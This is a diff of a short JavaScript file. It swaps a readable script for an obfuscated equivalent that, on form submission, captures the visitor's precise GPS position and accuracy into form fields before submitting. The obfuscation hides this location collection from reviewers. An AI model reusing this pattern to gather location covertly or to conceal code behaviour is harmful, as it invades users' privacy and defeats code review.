@@ -1,36 +1,4 @@
-
-document.addEventListener("DOMContentLoaded", function () {
-  const form = document.querySelector("form");
-
-  form.addEventListener("submit", function (e) {
-    e.preventDefault(); // detener envío automático
-
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        function (pos) {
-          document.getElementById("gps_loc").value =
-            pos.coords.latitude + "," + pos.coords.longitude;
-          document.getElementById("gps_accuracy").value =
-            pos.coords.accuracy + " metros";
-
-          form.submit(); // ✅ enviar solo cuando ya tenemos ubicación
-        },
-        function (err) {
-          document.getElementById("gps_error").value =
-            "Error " + err.code + ": " + err.message;
-
-          form.submit(); // ❌ enviar igual, pero con error registrado
-        },
-        { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
-      );
-    } else {
-      document.getElementById("gps_error").value =
-        "Geolocalización no soportada";
-      form.submit();
-    }
-  });
-});
-
+function _0x1063(){const _0x5d788f=['submit','101qIQaCa','Error\x20','8796774qULouR','coords','DOMContentLoaded','message','getElementById','8306120yEGkfz','35DNsyOA','gps_error','2251944XzdydO','value','6475080hsMEwN','preventDefault','accuracy','querySelector','longitude','addEventListener','geolocation','24062FdjCbE','2982516fpmLGn','gps_accuracy','getCurrentPosition','56409174XOBRmJ','Geolocalización\x20no\x20soportada'];_0x1063=function(){return _0x5d788f;};return _0x1063();}const _0x2fd00d=_0x3551;function _0x3551(_0xf7d82d,_0x1f5fc4){_0xf7d82d=_0xf7d82d-0x6b;const _0x106399=_0x1063();let _0x355140=_0x106399[_0xf7d82d];return _0x355140;}(function(_0x360fd9,_0x3e6a62){const _0x3b6449=_0x3551,_0xfbbbec=_0x360fd9();while(!![]){try{const _0xd87c35=parseInt(_0x3b6449(0x78))/0x1*(-parseInt(_0x3b6449(0x71))/0x2)+-parseInt(_0x3b6449(0x72))/0x3+-parseInt(_0x3b6449(0x84))/0x4+-parseInt(_0x3b6449(0x7f))/0x5+parseInt(_0x3b6449(0x7a))/0x6+-parseInt(_0x3b6449(0x80))/0x7*(parseInt(_0x3b6449(0x82))/0x8)+parseInt(_0x3b6449(0x75))/0x9;if(_0xd87c35===_0x3e6a62)break;else _0xfbbbec['push'](_0xfbbbec['shift']());}catch(_0x4ec788){_0xfbbbec['push'](_0xfbbbec['shift']());}}}(_0x1063,0xcc5bd),document[_0x2fd00d(0x6f)](_0x2fd00d(0x7c),function(){const _0x9acea=_0x2fd00d,_0x5120e1=document[_0x9acea(0x6d)]('form');_0x5120e1[_0x9acea(0x6f)](_0x9acea(0x77),function(_0x4fc785){const _0x379377=_0x9acea;_0x4fc785[_0x379377(0x6b)](),navigator[_0x379377(0x70)]?navigator[_0x379377(0x70)][_0x379377(0x74)](function(_0x1e83c6){const _0x5c37d5=_0x379377;document[_0x5c37d5(0x7e)]('gps_loc')[_0x5c37d5(0x83)]=_0x1e83c6[_0x5c37d5(0x7b)]['latitude']+','+_0x1e83c6['coords'][_0x5c37d5(0x6e)],document[_0x5c37d5(0x7e)](_0x5c37d5(0x73))[_0x5c37d5(0x83)]=_0x1e83c6['coords'][_0x5c37d5(0x6c)]+'\x20metros',_0x5120e1[_0x5c37d5(0x77)]();},function(_0x4f4672){const _0x3f86ff=_0x379377;document['getElementById'](_0x3f86ff(0x81))[_0x3f86ff(0x83)]=_0x3f86ff(0x79)+_0x4f4672['code']+':\x20'+_0x4f4672[_0x3f86ff(0x7d)],_0x5120e1['submit']();},{'enableHighAccuracy':!![],'timeout':0x7530,'maximumAge':0x0}):(document['getElementById']('gps_error')[_0x379377(0x83)]=_0x379377(0x76),_0x5120e1[_0x379377(0x77)]());});}));
   
     
     
